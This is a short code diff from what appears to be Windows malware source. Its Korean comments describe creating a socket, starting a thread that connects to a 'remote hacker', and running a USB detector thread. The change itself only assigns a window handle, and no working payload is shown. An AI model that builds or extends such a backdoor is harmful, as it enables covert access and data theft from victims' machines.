@@ -54,6 +54,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main역할�
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 		MessageBox(hWnd, TEXT("WSAStartUp Failed"), TEXT("Error"), MB_OK);
 
+	hWndMain = hWnd;
 	//소켓생성
 	CreateSocket();
 	//원격해커에게 접속시도할 쓰레드 생성 ,USB 디텍터 스레드 실행
